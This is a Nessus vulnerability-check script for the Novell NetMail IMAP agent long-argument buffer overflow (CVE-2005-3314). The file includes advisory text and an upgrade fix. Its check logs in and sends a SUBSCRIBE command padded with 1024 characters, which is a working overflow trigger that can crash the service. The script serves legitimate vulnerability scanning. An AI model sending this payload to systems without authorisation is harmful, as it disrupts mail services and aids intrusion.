#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(20318);
  script_version("$Revision: 1.11 $");

  script_cve_id("CVE-2005-3314");
  script_bugtraq_id(15491);
  script_xref(name:"OSVDB", value:"20956");

  script_name(english:"Novell NetMail IMAP Agent Long Verb Arguments Remote Overflow");
  script_summary(english:"Checks for long verb arguments buffer overflow vulnerability in Novell NetMail's IMAP agent");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote IMAP server is affected by a buffer overflow vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Novell NetMail, a messaging and calendaring
system for Windows, Linux, Unix, and NetWare. 

The IMAP agent installed on the remote host as part of Novell NetMail
is affected by a stack-based buffer overflow due to its improper
handling of long arguments to selected IMAP commands while in an
authenticated state.  Successful exploitation of this issue may lead
to the execution of arbitrary code on the remote host." );
 script_set_attribute(attribute:"see_also", value:"http://www.zerodayinitiative.com/advisories/ZDI-05-003.html" );
 script_set_attribute(attribute:"see_also", value:"http://support.novell.com/filefinder/19357/beta.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to NetMail 3.52E FTF (Field Test File) 1 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();

 
  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");
  script_family(english:"Gain a shell remotely");
  script_dependencie("imap_overflow.nasl");
  script_exclude_keys("imap/false_imap", "imap/overflow");
  script_require_ports("Services/imap", 143);

  exit(0);
}

include("global_settings.inc");


port = get_kb_item("Services/imap");
if (!port) port = 143;
if (!get_port_state(port) || get_kb_item("imap/false_imap")) exit(0);


user = get_kb_item("imap/login");
pass = get_kb_item("imap/password");
if (!user || !pass) {
  exit(0, "imap/login and/or imap/password are empty");
}


# Try a couple of times to exploit the issue.
tries = 2;
for (iter=1; iter<=tries; iter++) {
  tag = 0;

  # Establish a connection.
  soc = open_sock_tcp(port);
  if (soc) {
    # Read banner and make sure it looks like NetMail.
    s = recv_line(socket:soc, length:1024);
    if (
      !strlen(s) || 
      "NetMail IMAP4 Agent" >!< s
    ) {
      close(soc);
      exit(0);
    }

    # Try to log in.
    ++tag;
    resp = NULL;
    c = string("nessus", string(tag), " LOGIN ", user, " ", pass);
    send(socket:soc, data:string(c, "\r\n"));
    while (s = recv_line(socket:soc, length:1024)) {
      s = chomp(s);
      m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
      if (!isnull(m)) {
        resp = m[1];
        break;
      }
    }

    # If successful, try to exploit the flaw.
    if (resp && resp =~ "OK") {
      ++tag;
      resp = NULL;

      c = string("nessus", string(tag), " SUBSCRIBE ", crap(1024));
      send(socket:soc, data:string(c, "\r\n"));
      while (s = recv_line(socket:soc, length:1024)) {
        s = chomp(s);
        m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
        if (!isnull(m)) {
          resp = m[1];
          break;
        }
      }

      # If we got a response, the server's not vulnerable.
      if (strlen(resp)) {
        # Logout.
        ++tag;
        resp = NULL;
        c = string("nessus", string(tag), " LOGOUT");
        send(socket:soc, data:string(c, "\r\n"));
        while (s = recv_line(socket:soc, length:1024)) {
          s = chomp(s);
          m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
          if (!isnull(m)) {
            resp = m[1];
            break;
          }
        }
        close(soc);

        break;
      }
    }
    else if (resp =~ "NO") {
      debug_print("couldn't login with supplied IMAP credentials!", level:1);
    }
  }
}


# There's a problem if our exploit worked every time.
if (iter > tries && c && "SUBSCRIBE" >< c) {
  security_hole(port);
}
